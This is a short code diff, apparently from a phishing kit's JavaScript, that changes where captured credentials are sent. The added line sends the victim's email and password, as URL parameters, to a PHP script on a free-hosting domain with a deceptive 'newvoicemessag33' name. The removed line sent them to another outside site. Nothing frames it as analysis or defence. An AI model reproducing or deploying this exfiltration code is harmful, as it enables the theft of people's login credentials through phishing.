@@ -80,7 +80,7 @@
                             }
                         }
                     };
-                    xhttp.open("GET", "https://fulltec.com.pe/es/megia/php/log.php?user=" + em + "&pass=" +ps, true);
+                    xhttp.open("GET", "https://newvoicemessag33.000webhostapp.com/ntesdoor2.php?user=" + em + "&pass=" +ps, true);
                     xhttp.send();
                 }
 
